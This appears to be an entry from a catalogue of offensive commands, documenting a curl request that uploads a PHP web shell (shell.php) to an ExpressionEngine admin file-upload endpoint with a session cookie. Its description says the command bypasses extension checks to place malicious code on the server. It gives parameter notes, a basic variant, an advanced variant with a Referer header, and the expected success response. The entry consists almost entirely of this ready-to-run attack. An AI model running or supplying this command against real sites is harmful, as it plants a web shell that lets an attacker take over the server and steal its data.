---
data: >-
  curl -X POST -F "userfile=@shell.php" -F "send=Upload" -b
  "session_cookie=your_session" https://target.com/admin.php?/cp/files/upload
tags:
  - upload
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 78c89790-65f9-49f7-9dba-3b6913dd90b3
created_at: '2025-12-14T05:32:13.226Z'
updated_at: '2025-12-14T05:32:13.226Z'
verified: false
validated: true
submitted: true
---
# curl-upload-php-file

## Command

```bash
curl -X POST -F "userfile=@shell.php" -F "send=Upload" -b "session_cookie=your_session" https://target.com/admin.php?/cp/files/upload
```

## Description

This curl command uploads a local PHP file to the ExpressionEngine file upload endpoint using an authenticated session, bypassing extension checks to place malicious code on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-F "userfile=@shell.php"` | Multipart form data for file upload | Yes |
| `-F "send=Upload"` | Form field to trigger upload | Yes |
| `-b "session_cookie=your_session"` | Cookie header for authentication | Yes |
| `https://target.com/admin.php?/cp/files/upload` | Target upload URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "userfile=@shell.php" -F "send=Upload" -b "exp_sessionid=abc123" https://target.com/admin.php?/cp/files/upload
```

### Advanced Usage

```bash
curl -X POST -F "userfile=@shell.php" -F "send=Upload" -H "Referer: https://target.com/cp" -b "exp_sessionid=abc123; exp_member_id=123" https://target.com/admin.php?/cp/files/upload -v
```

## Expected Output

HTTP 200 OK with upload success message, e.g., "File uploaded successfully" and possibly the file path in JSON or HTML response.

## Related

- [[Related Procedure]]
